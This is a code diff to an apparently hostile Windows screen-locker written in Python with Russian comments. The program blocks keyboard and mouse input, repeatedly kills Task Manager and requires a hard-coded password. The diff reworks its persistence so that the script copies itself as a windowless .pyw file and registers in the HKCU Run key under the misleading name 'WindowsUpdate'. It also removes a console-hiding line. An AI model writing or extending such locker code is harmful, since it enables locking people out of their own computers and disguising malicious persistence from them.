@@ -7,6 +7,7 @@ import random
 import tempfile
 import urllib.request
 import tkinter as tk
+import shutil
 
 # ============================================================
 # >>> НАСТРОЙКИ <<<
@@ -14,9 +15,32 @@ PASSWORD = "1601"
 TIMER_SECONDS = 15   # стартовый таймер (0 — если из автозагрузки)
 # ============================================================
 
-# ---------- СКРЫВАЕМ КОНСОЛЬ ----------
-# Эта магия полностью прячет окно CMD при запуске
-ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+# ---------- НАДЁЖНЫЙ АВТОСТАРТ (РЕЕСТР) С КОПИРОВАНИЕМ ----------
+def add_to_startup():
+    try:
+        # Путь к текущему файлу (может быть .py)
+        current_path = os.path.abspath(__file__)
+        # Формируем путь с расширением .pyw
+        pyw_path = os.path.splitext(current_path)[0] + ".pyw"
+        
+        # Если текущий файл не .pyw, создаём копию .pyw
+        if not current_path.endswith(".pyw"):
+            try:
+                shutil.copy2(current_path, pyw_path)
+            except:
+                pass
+            current_path = pyw_path
+        
+        # Прописываем в автозагрузку путь к .pyw файлу
+        import winreg
+        key = winreg.HKEY_CURRENT_USER
+        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
+                         sys.executable.replace("python.exe", "pythonw.exe") + ' "' + current_path + '"')
+        winreg.CloseKey(reg)
+    except:
+        pass
 
 # ---------- глобальная блокировка клавиатуры/мыши ----------
 def block_input(block=True):
@@ -44,19 +68,6 @@ def kill_taskmgr():
         except:
             pass
         time.sleep(0.1)
-
-# ---------- НАДЁЖНЫЙ АВТОСТАРТ (РЕЕСТР) ----------
-def add_to_startup():
-    try:
-        import winreg
-        key = winreg.HKEY_CURRENT_USER
-        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        reg = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(reg, "WindowsUpdate", 0, winreg.REG_SZ,
-                         sys.executable + ' "' + os.path.abspath(__file__) + '"')
-        winreg.CloseKey(reg)
-    except:
-        pass
 
 # ---------- анимация запуска ----------
 def show_boot_animation():
